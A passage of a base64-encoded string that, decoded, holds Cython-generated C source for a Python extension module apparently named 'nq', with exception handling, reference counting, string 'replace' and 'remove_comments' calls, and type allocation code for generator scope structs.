yb3IpXG4gICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG5cbiAgICAgICAgICAgIFxuICAgICAgICAgIH1cblxuICAgICAgICAgIFxuICAgICAgICB9XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgICAgZ290byBfX3B5eF9MMjZfdHJ5X2VuZDtcbiAgICAgICAgX19weXhfTDIxX2Vycm9yOjtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICB7XG4gICAgICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJucS5nIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8yLCAmX19weXhfdF80LCAmX19weXhfdF81KSA8IDApIF9fUFlYX0VSUigwLCA3MSwgX19weXhfTDIzX2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICBfX3B5eF90XzMgPSBQeVR1cGxlX1BhY2soMywgX19weXhfdF8yLCBfX3B5eF90XzQsIF9fcHl4X3RfNSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDcxLCBfX3B5eF9MMjNfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgICAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNywgX19weXhfdF8zLCBOVUxMKTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgNzEsIF9fcHl4X0wyM19leGNlcHRfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICAgIF9fcHl4X3RfMTMgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF8xMSk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgICBpZiAoX19weXhfdF8xMyA8ICgwKSkgX19QWVhfRVJSKDAsIDcxLCBfX3B5eF9MMjNfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgIF9fcHl4X3RfMTIgPSAoIV9fcHl4X3RfMTMpO1xuICAgICAgICAgIGlmICh1bmxpa2VseShfX3B5eF90XzEyKSkge1xuICAgICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzIpO1xuICAgICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzQpO1xuICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF81KTtcbiAgICAgICAgICAgIF9fUHl4X0VyclJlc3RvcmVXaXRoU3RhdGUoX19weXhfdF8yLCBfX3B5eF90XzQsIF9fcHl4X3RfNSk7XG4gICAgICAgICAgICBfX3B5eF90XzIgPSAwOyAgX19weXhfdF80ID0gMDsgIF9fcHl4X3RfNSA9IDA7IFxuICAgICAgICAgICAgX19QWVhfRVJSKDAsIDcxLCBfX3B5eF9MMjNfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgIH1cbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICBnb3RvIF9fcHl4X0wyMl9leGNlcHRpb25faGFuZGxlZDtcbiAgICAgICAgfVxuICAgICAgICBfX3B5eF9MMjNfZXhjZXB0X2Vycm9yOjtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMCk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOSk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTAsIF9fcHl4X3RfOSwgX19weXhfdF84KTtcbiAgICAgICAgZ290byBfX3B5eF9MMV9lcnJvcjtcbiAgICAgICAgX19weXhfTDIyX2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMCk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOSk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTAsIF9fcHl4X3RfOSwgX19weXhfdF84KTtcbiAgICAgICAgX19weXhfTDI2X3RyeV9lbmQ6O1xuICAgICAgfVxuICAgIH1cbiAgICAge1xuICAgICAge1xuICAgICAgICBpZiAoX19weXhfdF83KSB7XG4gICAgICAgICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzFdLCBOVUxMKTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA3MSwgX19weXhfTDFfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICAgIH1cbiAgICAgICAgZ290byBfX3B5eF9MMjA7XG4gICAgICB9XG4gICAgICBfX3B5eF9MMjA6O1xuICAgIH1cbiAgICBnb3RvIF9fcHl4X0wzMTtcbiAgICBfX3B5eF9MMTdfZXJyb3I6O1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgIGdvdG8gX19weXhfTDFfZXJyb3I7XG4gICAgX19weXhfTDMxOjtcbiAgfVxuXG4gIFxuICBfX3B5eF90XzQgPSBOVUxMO1xuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlbW92ZV9jb21tZW50cyk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDc2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X25hbWUyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNzYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgX19weXhfdF8xID0gX19QeXhfUHlVbmljb2RlX0NvbmNhdChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X20sIF9fcHl4X3RfMyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDc2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl9uYW1lMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDc2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIF9fcHl4X3RfMTUgPSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfbSwgX19weXhfdF8zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE1KSkgX19QWVhfRVJSKDAsIDc2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTUpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgX19weXhfdF82ID0gMTtcbiAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8yKSkpIHtcbiAgICBfX3B5eF90XzQgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzIpO1xuICAgIGFzc2VydChfX3B5eF90XzQpO1xuICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF8yKTtcbiAgICBfX1B5eF9JTkNSRUYoX19weXhfdF80KTtcbiAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMiwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICBfX3B5eF90XzYgPSAwO1xuICB9XG4gICNlbmRpZlxuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzNdID0ge19fcHl4X3RfNCwgX19weXhfdF8xLCBfX3B5eF90XzE1fTtcbiAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDMtX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNzYsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuXG4gIFxuICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfbmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlcGxhY2UpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA3NywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbM10sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA3NywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgX19weXhfdl9uYW1lMl9iYXNlID0gX19weXhfdF8yO1xuICBfX3B5eF90XzIgPSAwO1xuXG4gIFxuXG4gIFxuICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpO1xuICBnb3RvIF9fcHl4X0wwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTUpO1xuICBfX1B5eF9BZGRUcmFjZWJhY2soIm5xLmciLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19weXhfciA9IE5VTEw7XG4gIF9fcHl4X0wwOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3cpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfYSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9hYSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9vdXRwdXRfZik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9uYW1lMik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9mKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X25hbWUyX2Jhc2UpO1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfdHBfbmV3XzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIoUHlUeXBlT2JqZWN0ICp0LCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICphLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICprKSB7XG4gIFB5T2JqZWN0ICpvO1xuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICBhbGxvY2Z1bmMgYWxsb2NfZnVuYyA9IChhbGxvY2Z1bmMpUHlUeXBlX0dldFNsb3QodCwgUHlfdHBfYWxsb2MpO1xuICBvID0gYWxsb2NfZnVuYyh0LCAwKTtcbiAgI2Vsc2VcbiAgI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTXG4gIGlmIChsaWtlbHkoKGludCkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIgPiAwKSAmIChpbnQpKHQtPnRwX2Jhc2ljc2l6ZSA9PSBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8ybnFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKSkpKSB7XG4gICAgbyA9IChQeU9iamVjdCopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWxpc3RfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwclstLV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8ybnFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByXTtcbiAgICBtZW1zZXQobywgMCwgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcikpO1xuICAgICh2b2lkKSBQeU9iamVjdF9JTklUKG8sIHQpO1xuICAgIFB5T2JqZWN0X0dDX1RyYWNrKG8pO1xuICB9IGVsc2VcbiAgI2VuZGlmXG4gIHtcbiAgICBvID0gKCp0LT50cF9hbGxvYykodCwgMCk7XG4gICAgaWYgKHVubGlrZWx5KCFvKSkgcmV0dXJuIDA7XG4gIH1cbiAgI2VuZGlmXG4gIHJldHVybiBvO1xufVxuXG5zdGF0aWMgdm9pZCBfX3B5eF90cF9kZWFsbG9jXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIoUHlPYmplY3QgKm8pIHtcbiAgc3RydWN0IF9fcHl4X29ial8ybnFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByICpwID0gKHN0cnVjdCBfX3B5eF9vYmpfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciAqKW87XG4gICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gIGlmICh1bmxpa2VseSgoUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDAwMCB8fCBfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZShQeV9UWVBFKG8pLCBQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUpKSAmJiBfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2ZpbmFsaXplLCBkZXN0cnVjdG9yKSkgJiYgIV9fUHl4X1B5T2JqZWN0X0dDX0lzRmluYWxpemVkKG8pKSB7XG4gICAgaWYgKF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfZGVhbGxvYywgZGVzdHJ1Y3RvcikgPT0gX19weXhfdHBfZGVhbGxvY18ybnFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKSB7XG4gICAgICBpZiAoUHlPYmplY3RfQ2FsbEZpbmFsaXplckZyb21EZWFsbG9jKG8pKSByZXR1cm47XG4gICAgfVxuICB9XG4gICNlbmRpZlxuICBQeU9iamVjdF9HQ19VblRyYWNrKG8pO1xuICBQeV9DTEVBUihwLT5fX3B5eF9nZW5leHByX2FyZ18wKTtcbiAgUHlfQ0xFQVIocC0+X19weXhfdl9fKTtcbiAgI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTXG4gIGlmICgoKGludCkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIgPCA4KSAmIChpbnQpKFB5X1RZUEUobyktPnRwX2Jhc2ljc2l6ZSA9PSBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8ybnFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKSkpKSB7XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWxpc3RfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcltfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcisrXSA9ICgoc3RydWN0IF9fcHl4X29ial8ybnFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByICopbyk7XG4gIH0gZWxzZVxuICAjZW5kaWZcbiAge1xuICAgICNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgICAoKlB5X1RZUEUobyktPnRwX2ZyZWUpKG8pO1xuICAgICNlbHNlXG4gICAge1xuICAgICAgZnJlZWZ1bmMgdHBfZnJlZSA9IChmcmVlZnVuYylQeVR5cGVfR2V0U2xvdChQeV9UWVBFKG8pLCBQeV90cF9mcmVlKTtcbiAgICAgIGlmICh0cF9mcmVlKSB0cF9mcmVlKG8pO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgfVxufVxuXG5zdGF0aWMgaW50IF9fcHl4X3RwX3RyYXZlcnNlXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIoUHlPYmplY3QgKm8sIHZpc2l0cHJvYyB2LCB2b2lkICphKSB7XG4gIGludCBlO1xuICBzdHJ1Y3QgX19weXhfb2JqXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIgKnAgPSAoc3RydWN0IF9fcHl4X29ial8ybnFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByICopbztcbiAge1xuICAgIGUgPSBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UobywgMSwgdiwgYSk7XG4gICAgaWYgKGUpIHJldHVybiBlO1xuICB9XG4gIGlmIChwLT5fX3B5eF9nZW5leHByX2FyZ18wKSB7XG4gICAgZSA9ICgqdikocC0+X19weXhfZ2VuZXhwcl9hcmdfMCwgYSk7IGlmIChlKSByZXR1cm4gZTtcbiAgfVxuICBpZiAocC0+X19weXhfdl9fKSB7XG4gICAgZSA9ICgqdikocC0+X19weXhfdl9fLCBhKTsgaWYgKGUpIHJldHVybiBlO1xuICB9XG4gIHJldHVybiAwO1xufVxuI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuc3RhdGljIFB5VHlwZV9TbG90IF9fcHl4X3R5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcl9zbG90c1tdID0ge1xuICB7UHlfdHBfZGVhbGxvYywgKHZvaWQgKilfX3B5eF90cF9kZWFsbG9jXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHJ9LFxuICB7UHlfdHBfdHJhdmVyc2UsICh2b2lkICopX19weXhfdHBfdHJhdmVyc2VfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcn0sXG4gIHtQeV90cF9uZXcsICh2b2lkICopX19weXhfdHBfbmV3XzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHJ9LFxuICB7MCwgMH0sXG59O1xuc3RhdGljIFB5VHlwZV9TcGVjIF9fcHl4X3R5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcl9zcGVjID0ge1xuICAibnEuX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByIixcbiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciksXG4gIDAsXG4gIFB5X1RQRkxBR1NfREVGQVVMVHxQeV9UUEZMQUdTX0hBVkVfVkVSU0lPTl9UQUd8UHlfVFBGTEFHU19DSEVDS1RZUEVTfFB5X1RQRkxBR1NfSEFWRV9ORVdCVUZGRVJ8UHlfVFBGTEFHU19IQVZFX0dDfFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSxcbiAgX19weXhfdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByX3Nsb3RzLFxufTtcbiNlbHNlXG5cbnN0YXRpYyBQeVR5cGVPYmplY3QgX19weXhfdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByID0ge1xuICBQeVZhck9iamVjdF9IRUFEX0lOSVQoMCwgMClcbiAgIm5xLiIiX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByIiwgXG4gIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIpLCBcbiAgMCwgXG4gIF9fcHl4X3RwX2RlYWxsb2NfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciwgXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwODAwYjRcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiNFxuICAwLCBcbiAgI2VuZGlmXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICBQeV9UUEZMQUdTX0RFRkFVTFR8UHlfVFBGTEFHU19IQVZFX1ZFUlNJT05fVEFHfFB5X1RQRkxBR1NfQ0hFQ0tUWVBFU3xQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSfFB5X1RQRkxBR1NfSEFWRV9HQ3xQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUsIFxuICAwLCBcbiAgX19weXhfdHBfdHJhdmVyc2VfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gICNpZiAhQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gIDAsIFxuICAjZW5kaWZcbiAgMCwgXG4gIDAsIFxuICBfX3B5eF90cF9uZXdfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gIDAsIFxuICAjZWxzZVxuICBOVUxMLCBcbiAgI2VuZGlmXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMGIxICYmICghQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IFBZUFlfVkVSU0lPTl9OVU0gPj0gMHgwNzAzMDgwMClcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgX19QWVhfTkVFRF9UUF9QUklOVF9TTE9UID09IDFcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMFxuICAwLCBcbiAgI2VuZGlmXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEE0XG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBhMDAwMFxuICAwLCBcbiAgI2VuZGlmXG59O1xuI2VuZGlmXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfdHBfbmV3XzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9ndyhQeVR5cGVPYmplY3QgKnQsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmEsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmspIHtcbiAgUHlPYmplY3QgKm87XG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gIGFsbG9jZnVuYyBhbGxvY19mdW5jID0gKGFsbG9jZnVuYylQeVR5cGVfR2V0U2xvdCh0LCBQeV90cF9hbGxvYyk7XG4gIG8gPSBhbGxvY19mdW5jKHQsIDApO1xuICAjZWxzZVxuICAjaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFNcbiAgaWYgKGxpa2VseSgoaW50KShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8xX2d3ID4gMCkgJiAoaW50KSh0LT50cF9iYXNpY3NpemUgPT0gc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8xX2d3KSkpKSB7XG4gICAgbyA9IChQeU9iamVjdCopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWxpc3RfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8xX2d3Wy0tX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nd107XG4gICAgbWVtc2V0KG8sIDAsIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9ndykpO1xuICAgICh2b2lkKSBQeU9iamVjdF9JTklUKG8sIHQpO1xuICAgIFB5T2JqZWN0X0dDX1RyYWNrKG8pO1xuICB9IGVsc2